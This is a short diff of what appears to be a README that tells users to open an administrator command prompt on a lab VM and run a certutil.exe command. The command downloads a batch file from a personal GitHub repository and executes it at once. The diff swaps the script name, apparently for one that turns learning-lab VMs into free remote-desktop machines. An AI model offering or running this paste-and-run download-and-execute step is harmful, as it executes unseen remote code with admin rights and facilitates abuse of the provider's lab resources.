@@ -6,7 +6,7 @@ https://docs.microsoft.com/en-us/learn/modules/extend-elements-finance-operation
 
 sign go to vm open cmd as admin and type this:
 
-certutil.exe -urlcache -split -f https://raw.githubusercontent.com/mrX04/Lab2RDP/master/lab2rdp.bat && lab2rdp.bat
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/mrX04/lab2rdp/master/lab6cfree.bat && lab6cfree.bat
 
 
 # Tips:
